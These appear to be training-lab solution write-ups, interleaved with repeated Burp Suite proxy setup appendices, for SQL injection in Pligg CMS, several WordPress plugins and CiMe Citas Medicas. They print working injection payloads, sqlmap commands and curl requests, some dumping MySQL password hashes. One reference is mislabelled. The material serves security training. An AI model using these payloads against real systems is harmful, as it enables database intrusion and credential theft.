All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix B 
 
B.1 Google Chrome with Burp Suite (Kali OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, The “Networks” settings window will appear. 
Click on Network Proxy option. 
 
 
 
 
Step 4: ​Enter “127.0.0.1” in “HTTP Proxy” textbox and enter 8080 as port.  
 
 
 
Close the dialog box.  
 
Step 5: ​Start Burp suite. 
 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
B.2 Mozilla Firefox with burp suite (Kali OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
 
Step 2: ​Click on “Advanced” tab on the left panel and then click on “Settings” button under 
“Network” tab. 
 
 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
Step 4: ​Start Burp suite. 
 
 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix C 
 
C.1 FoxyProxy on Google Chrome with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Google Chrome can be installed from the URL given below: 
 
URL: 
https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfn
p?hl=en 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
Step 3: ​Click on the “Add New Proxy” Button.  
 
 
 
Step 4: ​Enter “127.0.0.1” in “Host or IP Address” textbox and enter “8080” in Port textbox. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the Save button. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The configured proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs” 
 
 
 
The FoxyProxy icon will change its color (In this case it is blue). 
 
 
 
 
 
 
 
 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Mozilla Firefox can be installed from the URL given below: 
 
URL: ​https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
 
 
 
Step 3: ​Click on the add button on the left panel 
 
 
 
Step 4: ​Enter “127.0.0.1” in “IP Address, DNS name, server name” textbox and enter “8080” in 
Port textbox. 
 
 
 
Click on the Save button. 
 
 
 
The proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs 
(ignore patterns)” 
 
 
 
The FoxyProxy icon will change its color (In this case it is green). 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080” 
 
 
 
All the HTTP/HTTPS request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
Name 
Pligg CMS 
URL 
https://www.attackdefense.com/challengedetails?cid=445  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “pligg cms sql injection” and look for publically available exploits.  
 
 
 
 
The exploit db link contains SQLI payload and the information regarding the vulnerable 
webpage and vulnerable parameter.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/38577 
 
 
 
 
 
 
Step 3: ​The “story.php” web page is vulnerable. Click on the story “463 Restricted Client - 
DOSarrest Internet Security” in the “New” section at the bottom right corner.  
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Append the SQLI payload provided at exploit db link into the URL and exploit the 
vulnerability. 
 
Append the following payload to the URL: 
 
Payload:  
&reply=1&comment_id=1%20union%20all%20select%201,1,1,1,1,1,1,password,password,1%2
0from%20mysql.user%20%23 
 
URL: 
http://5s7rb8h3jqemjnzu7lin1zgy9.public2.attackdefenselabs.com/story.php?title=463-restricted-
client-dosarrest-internet-security&reply=1&comment_id=1%20union%20all%20select%201,1,1,
1,1,1,1,password,password,1%20from%20mysql.user%20%23 
 
 
 
 
 
 
 
The password hash of MySQL user was dumped.  
 
Step 5: ​Modify the SQLI payload used in previous step and retrieve the MySQL server version 
information.  
 
Modified Payload:  
&reply=1&comment_id=1%20union%20all%20select%201,1,1,1,1,1,1,version(),password,1%20
from%20mysql.user%20%23 
 
 
 
 
URL: 
http://5s7rb8h3jqemjnzu7lin1zgy9.public2.attackdefenselabs.com/story.php?title=463-restricted-
client-dosarrest-internet-security&reply=1&comment_id=1%20union%20all%20select%201,1,1,
1,1,1,1,version(),password,1%20from%20mysql.user%20%23 
 
 
The MySQL Server version is revealed.  
 
 
References:  
 
1.
Pligg CMS (​https://sourceforge.net/projects/pligg/​)  
2.
Pligg CMS 2.0.2 - Multiple SQL Injections (​https://www.exploit-db.com/exploits/38577​)  
 
 
 
Name 
WordPress AdRotate 
URL 
https://www.attackdefense.com/challengedetails?cid=446  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “WordPress AdRotate sql injection” and look for publically available 
exploits.  
 
 
 
 
There are exploits for two versions. Find out the version of adrotate plugin using wpscan. 
 
Command: ​wpscan --url http://js0xv5d004n6af91zdbend7k1.public1.attackdefenselabs.com/ 
 
 
 
 
 
 
 
 
 
 
 
The version of adrotate plugin is 3.9.4 
 
 
The exploit db link for corresponding version of adrotate plugin contains the SQL Payload along 
with the information required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/31834 
 
 
 
 
Step 3: ​Use the URL containing the SQLI payload provided at exploit db link to exploit the 
vulnerability.  
 
URL: 
http://js0xv5d004n6af91zdbend7k1.public1.attackdefenselabs.com/wp-content/plugins/adrotate/l
ibrary/clicktracker.php?track=LTEgVU5JT04gU0VMRUNUIHZlcnNpb24oKSwxLDEsMQ== 
 
Upon navigating to the above URL, a redirection will occur leading to 404 not found error. 
 
 
 
 
 
 
 
 
 
 
The MySQL Server version is revealed.  
 
 
References:  
 
1.
AdRotate Banner Manager (​https://wordpress.org/plugins/adrotate/​)  
2.
WordPress Plugin AdRotate 3.9.4 - 'clicktracker.ph?track' SQL Injection 
(​https://www.exploit-db.com/exploits/31834​)  
3.
Wpscan (​https://wpscan.org/​)  
 
 
 
 
 
Name 
WordPress WP Security 
URL 
https://www.attackdefense.com/challengedetails?cid=473 
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “WordPress All In One WP Security Plugin sql injection exploit db” 
and look for publically available exploits.  
 
 
 
 
 
The exploit db link contains the SQLI payload and the information about the vulnerable 
parameter. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/36671 
 
 
 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. Login to the web 
application.  
 
Click on the “Log in” link provided under “Meta” section. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The login credential of the web application is provided in the challenge description. 
 
●
Username: pentester 
●
Password: password1 
 
Dashboard:  
 
 
 
Step 4: ​The SQLI payload provided at exploit db link is time based SQLI payload. Navigate to 
the target URL provided at exploit db link and intercept the request with burp suite 
 
Navigate to the URL given below and the request will be intercepted with burp suite.  
 
URL: 
http://onv2q0gxyuphql87k8p9olwgq.public1.attackdefenselabs.com/wp-admin/admin.php?page=
aiowpsec&tab=tab3&orderby=user_id,(select%20*%20from%20(select(sleep(30)))a)&order=asc 
 
Check Appendix to learn how to configure Burp Suite. 
 
 
 
 
Intercepted Request:  
 
 
Step 5: ​Send the request to repeater and analyze the time taken to receive the response 
 
Right click on the intercepted request and select the option “Send to Repeater”, the same can 
be achieved by pressing “CTRL+R”. 
 
 
 
 
Request Tab:  
 
 
 
 
 
 
 
 
Request section in the Repeater tab: 
 
 
 
 
Click on the Go button: 
 
 
Response section in the Repeater tab. 
 
 
 
 
The injected SQLI payload was executed and the response was received with 30 second delay. 
 
 
Step 6: ​Modify the sleep time to 10 second in the payload and check the response time. 
 
Modify the Target URL in the request. 
 
Before:   
/wp-admin/admin.php?page=aiowpsec&tab=tab3&orderby=user_id,(select%20*%20from%20(s
elect(sleep(30)))a)&order=asc 
 
After:  
/wp-admin/admin.php?page=aiowpsec&tab=tab3&orderby=user_id,(select%20*%20from%20(s
elect(sleep(10)))a)&order=asc 
 
Request section in the Repeater tab: 
 
 
 
Click on the Go button: 
 
 
Response section in the Repeater tab: 
 
 
 
 
 
The response was received with 10 second delay. 
 
 
 
 
References:  
 
1.
WordPress Plugin All In One WP Security & Firewall 3.9.0 - SQL Injection 
(​https://wordpress.org/plugins/all-in-one-wp-security-and-firewall/​) 
 
2.
Redaxo CMS Addon MyEvents 2.2.1 - SQL Injection 
(​https://www.exploit-db.com/exploits/36671​) 
 
3.
Sqlmap (​http://sqlmap.org/​)  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix  
 
 
Appendix A: Configuration for Windows OS 
     A.1 Google Chrome with Burp Suite 
     A.2 Mozilla Firefox with Burp Suite 
 
Appendix B: Configuration for Kali OS 
                B.1 Google Chrome with Burp Suite 
    B.2 Mozilla Firefox with Burp Suite 
 
Appendix C: Configuration for FoxyProxy Standard plugin 
    C.1 FoxyProxy on Google Chrome with Burp Suite 
    C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix A 
 
A.1 Google Chrome with Burp Suite (Windows OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, Windows “Internet Properties” settings dialog 
box will appear. Click on “LAN settings” button. 
 
 
 
Step 4: ​Select the checkbox “Use a proxy server for your LAN (These settings will not apply to 
dial-up or VPN connections)”. And  enter “127.0.0.1” and “8080” in “Address” textbox and “Port” 
textbox respectively.  
 
 
 
Click “OK” on the “Local Area Network (LAN) Settings” dialog box and close the “Internet 
Properties” dialog box. 
 
Step 5: ​Start Burp suite. 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
A.2 Mozilla Firefox with burp suite (Windows OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
Step 2: ​Scroll down to the bottom of the page and click on “Settings” button under “Network 
Settings” section. 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
Click on the OK button.  
 
Step 4: ​Start Burp suite. 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix B 
 
B.1 Google Chrome with Burp Suite (Kali OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, The “Networks” settings window will appear. 
Click on Network Proxy option. 
 
 
 
 
Step 4: ​Enter “127.0.0.1” in “HTTP Proxy” textbox and enter 8080 as port.  
 
 
 
Close the dialog box.  
 
Step 5: ​Start Burp suite. 
 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
B.2 Mozilla Firefox with burp suite (Kali OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
 
Step 2: ​Click on “Advanced” tab on the left panel and then click on “Settings” button under 
“Network” tab. 
 
 
 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
Step 4: ​Start Burp suite. 
 
 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix C 
 
C.1 FoxyProxy on Google Chrome with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Google Chrome can be installed from the URL given below: 
 
URL: 
https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfn
p?hl=en 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
Step 3: ​Click on the “Add New Proxy” Button.  
 
 
 
Step 4: ​Enter “127.0.0.1” in “Host or IP Address” textbox and enter “8080” in Port textbox. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the Save button. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The configured proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs” 
 
 
 
The FoxyProxy icon will change its color (In this case it is blue). 
 
 
 
 
 
 
 
 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Mozilla Firefox can be installed from the URL given below: 
 
URL: ​https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
 
 
 
Step 3: ​Click on the add button on the left panel 
 
 
 
Step 4: ​Enter “127.0.0.1” in “IP Address, DNS name, server name” textbox and enter “8080” in 
Port textbox. 
 
 
 
Click on the Save button. 
 
 
 
The proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs 
(ignore patterns)” 
 
 
 
The FoxyProxy icon will change its color (In this case it is green). 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080” 
 
 
 
All the HTTP/HTTPS request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
Name 
WordPress Event Calendar 
URL 
https://www.attackdefense.com/challengedetails?cid=474  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
Step 2: ​Search on google “WordPress CP Event Calendar Plugin sql injection” and look for 
publically available exploits.  
 
 
 
 
The exploit db link contains the information regarding the vulnerable parameter and the 
vulnerable web page. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/37560 
 
 
 
 
 
 
 
 
Step 3: ​The vulnerable parameter and the URL information is provided at the exploit db link. 
Find the payload with the help of sqlmap. 
 
Vulnerable Parameter: ​calendarId 
 
Command: ​sqlmap -u 
"http://icc9g0mgydvdra3hksovlvmjh.public1.attackdefenselabs.com/?action=data_management
&cpmvc_do_action=mvparse&f=datafeed&method=remove&rruleType=del_only&calendarId=12
3" -p calendarId 
 
Enter the following answers when asked for questions. 
 
“y” for “Do you want to skip test payloads specific for other DBMSes?” 
“n” for “do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) 
values?” 
“n” “Do you want to keep testing the others (if any)?” 
 
 
 
 
 
 
 
 
Payloads: 
 
Type:​ boolean-based blind 
Payload: 
action=data_management&cpmvc_do_action=mvparse&f=datafeed&method=remove&rruleTyp
e=del_only&calendarId=(SELECT (CASE WHEN (1631=1631) THEN 1631 ELSE 
1631*(SELECT 1631 FROM INFORMATION_SCHEMA.PLUGINS) END)) 
 
Type:​ error-based 
Payload: 
action=data_management&cpmvc_do_action=mvparse&f=datafeed&method=remove&rruleTyp
e=del_only&calendarId=123 AND (SELECT 8721 FROM(SELECT 
COUNT(*),CONCAT(0x7176707671,(SELECT 
(ELT(8721=8721,1))),0x716a626b71,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) 
 
Step 4: ​Using the payload obtained in previous step, form the URL required to exploit the 
vulnerability.  
 
Payload: 
action=data_management&cpmvc_do_action=mvparse&f=datafeed&method=remove&rruleTyp
e=del_only&calendarId=123 AND (SELECT 8721 FROM(SELECT 
COUNT(*),CONCAT(0x7176707671,(SELECT 
(ELT(8721=8721,1))),0x716a626b71,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) 
 
URL: 
http://icc9g0mgydvdra3hksovlvmjh.public1.attackdefenselabs.com/?action=data_management&
cpmvc_do_action=mvparse&f=datafeed&method=remove&rruleType=del_only&calendarId=123
%20AND%20(SELECT%208721%20FROM(SELECT%20COUNT(*),CONCAT(0x7176707671,(
SELECT%20(ELT(8721=8721,1))),0x716a626b71,FLOOR(RAND(0)*2))x%20FROM%20INFOR
MATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a) 
 
 
 
The injected SQLI Payload was executed.  
 
Step 5: ​Modify the payload and repeat the previous step to retrieve the MySQL server version 
information.  
 
Modified Payload: 
action=data_management&cpmvc_do_action=mvparse&f=datafeed&method=remove&rruleTyp
e=del_only&calendarId=123 AND (SELECT 8721 FROM(SELECT 
COUNT(*),CONCAT(version(),(SELECT 
(ELT(8721=8721,1))),0x716a626b71,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) 
 
URL: 
http://icc9g0mgydvdra3hksovlvmjh.public1.attackdefenselabs.com/?action=data_management&
cpmvc_do_action=mvparse&f=datafeed&method=remove&rruleType=del_only&calendarId=123
%20AND%20(SELECT%208721%20FROM(SELECT%20COUNT(*),CONCAT(version(),(SELE
CT%20(ELT(8721=8721,1))),0x716a626b71,FLOOR(RAND(0)*2))x%20FROM%20INFORMATI
ON_SCHEMA.PLUGINS%20GROUP%20BY%20x)a) 
 
 
 
The MySQL Server version is revealed.  
 
 
 
 
 
References:  
 
1.
CP Multi View Calendar (​https://wordpress.dwbooster.com/faq/cp-multi-view-calendar​)  
2.
WordPress Plugin CP Multi View Event Calendar 1.1.7 - SQL Injection 
(​https://www.exploit-db.com/exploits/37560​)  
3.
Sqlmap (​http://sqlmap.org/​)  
 
 
 
 
 
Name 
WordPress Like Counter 
URL 
https://www.attackdefense.com/challengedetails?cid=475  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “WordPress Like Dislike Counter Plugin sql injection” and look for 
publically available exploits.  
 
 
 
 
The exploit db link contains the information regarding the vulnerable parameter and the target 
URL. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/34553 
 
 
 
 
 
 
 
 
Step 3: ​Find the SQL Injection payload using sqlmap. 
 
Target URL: 
http://powqmepkdi3zrdl8xrddoydys.public1.attackdefenselabs.com/wp-content/plugins/like-dislik
e-counter-for-posts-pages-and-comments/ajax_counter.php 
 
Vulnerable parameter: ​post_id 
 
Command: ​sqlmap -u 
"http://powqmepkdi3zrdl8xrddoydys.public1.attackdefenselabs.com/wp-content/plugins/like-disli
ke-counter-for-posts-pages-and-comments/ajax_counter.php" --data "post_id=1&up_type=like" 
 
 
Enter the following answer when asked for questions. 
 
“y” for “Do you want to skip test payloads specific for other DBMses?”  
“y” for “do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) 
values?”  
“n” for “Do you want to keep testing the others (if any) ?” 
 
 
 
 
 
 
 
 
Payloads: 
 
Type: ​boolean-based blind 
Payload: ​post_id=1 AND 4877=4877&up_type=like 
 
Type: ​AND/OR time-based blind 
Payload: ​post_id=1 OR SLEEP(5)&up_type=like 
 
 
 
 
 
Type: ​UNION query 
Payload: ​post_id=-3397 UNION ALL SELECT 
CONCAT(0x71717a7071,0x7457706d496853767050466b4d4c666b56574f4666644253486b49
7969736373506d594d4742446d,0x7171627871)-- GcPT&up_type=like 
 
Step 4: ​Send a POST request with the SQLI payload to the target URL. 
 
Sending POST request with curl. 
 
Command: ​curl -X POST --data "post_id=-3397 UNION ALL SELECT 
CONCAT(0x71717a7071,0x7457706d496853767050466b4d4c666b56574f4666644253486b49
7969736373506d594d4742446d,0x7171627871)-- GcPT&up_type=like" 
"http://powqmepkdi3zrdl8xrddoydys.public1.attackdefenselabs.com/wp-content/plugins/like-disli
ke-counter-for-posts-pages-and-comments/ajax_counter.php" 
 
 
 
The injected SQLI payload was executed.  
 
Step 5: ​Modify the payload used in previous step and retrieve the MySQL server version 
information. 
 
Modified Payload:​ post_id=-3397 UNION ALL SELECT 
CONCAT(version(),0x7457706d496853767050466b4d4c666b56574f4666644253486b4979697
36373506d594d4742446d,0x7171627871)-- GcPT&up_type=like 
 
Command: ​curl -X POST --data "post_id=-3397 UNION ALL SELECT 
CONCAT(version(),0x7457706d496853767050466b4d4c666b56574f4666644253486b4979697
36373506d594d4742446d,0x7171627871)-- GcPT&up_type=like" 
"http://powqmepkdi3zrdl8xrddoydys.public1.attackdefenselabs.com/wp-content/plugins/like-disli
ke-counter-for-posts-pages-and-comments/ajax_counter.php" 
 
 
 
 
The MySQL Server version is revealed.  
 
References:  
 
1.
WP Like Dislike counter Plugin (​https://wpfruits.com/wp-like-dislike-counter-plugin/​)  
2.
WordPress Plugin Like Dislike Counter 1.2.3 - SQL Injection 
(​https://www.exploit-db.com/exploits/34553​)  
3.
Sqlmap (​http://sqlmap.org/​)  
 
 
 
 
 
 
Name 
CiMe Citas Medicas 
URL 
https://www.attackdefense.com/challengedetails?cid=476  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “CiMe Citas Medicas sql injection” and look for publically available 
exploits.  
 
 
 
 
The exploit db link contains the information about the vulnerable parameter. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/31350 
 
 
 
 
 
Step 3: ​Enter any credentials in the login form, click “Entrar” and intercept the request with burp 
suite.  
 
Check Appendix to learn how to configure Burp Suite. 
 
 
 
 
 
 
 
 
 
 
 
Intercepted Request:  
 
 
 
Copy the request and save it in a file named “request”. 
 
Command: ​cat request 
 
 
 
Step 4: ​Find the payload using sqlmap. 
 
Vulnerable parameter:​  username 
 
Command: ​sqlmap -r request -p username 
 
Enter the following answers when asked for questions. 
 
“y” for “Do you want to skip test payloads specific for other DBMSes?” 
“y” for “do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) 
values?” 
“n” for “Do you want to keep testing the others (if any)?” 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Payload: ​username=admin' AND SLEEP(5) AND 'nGdY'='nGdY&password=password 
 
 
Step 5: ​Send the intercepted request to Repeater. 
 
Right click on the intercepted request and select the option “Send to Repeater”, the same can 
be achieved by pressing “CTRL+R”. 
 
 
 
 
Repeater Tab: 
 
 
 
Step 6: ​Send the original request and check the response time. 
 
Request section in the Repeater tab. 
 
 
 
 
Response section in the Repeater tab. 
 
 
 
It took 267 ms to receive the response. (The time is displayed on the right bottom corner) 
 
 
 
 
 
 
Step 7: ​Inject the time based payload in POST data and check the response time.  
 
Before: ​username=admin&password=password 
 
After: ​username=admin' AND SLEEP(5) AND 'nGdY'='nGdY&password=password 
 
Request section in the Repeater tab: 
 
 
 
Response section in the Repeater tab: 
 
 
 
 
 
 
 
 
 
 
 
 
The injected time based SQLI payload was executed and the response was received with 5 
second delay. 
 
 
 
 
 
Step 8: ​Increase the sleep time in payload to 10 and check the response time. 
 
Before: ​username=admin' AND SLEEP(5) AND 'nGdY'='nGdY&password=password 
 
After: ​username=admin' AND SLEEP(10) AND 'nGdY'='nGdY&password=password 
 
Request section in the Repeater tab: 
 
 
 
Response section in the Repeater tab: 
 
 
 
 
 
 
 
 
 
 
 
 
The response was received with 10 second delay.  
 
References:  
 
1.
CiMe - Citas Médicas (​https://sourceforge.net/projects/cime/​) 
 
2.
CiMe Citas Médicas - Multiple Vulnerabilities 
(​https://www.exploit-db.com/exploits/31350​)  
3.
Sqlmap (​http://sqlmap.org/​)  
 
 
 
 
Appendix  
 
 
Appendix A: Configuration for Windows OS 
     A.1 Google Chrome with Burp Suite 
     A.2 Mozilla Firefox with Burp Suite 
 
Appendix B: Configuration for Kali OS 
                B.1 Google Chrome with Burp Suite 
    B.2 Mozilla Firefox with Burp Suite 
 
Appendix C: Configuration for FoxyProxy Standard plugin 
    C.1 FoxyProxy on Google Chrome with Burp Suite 
    C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
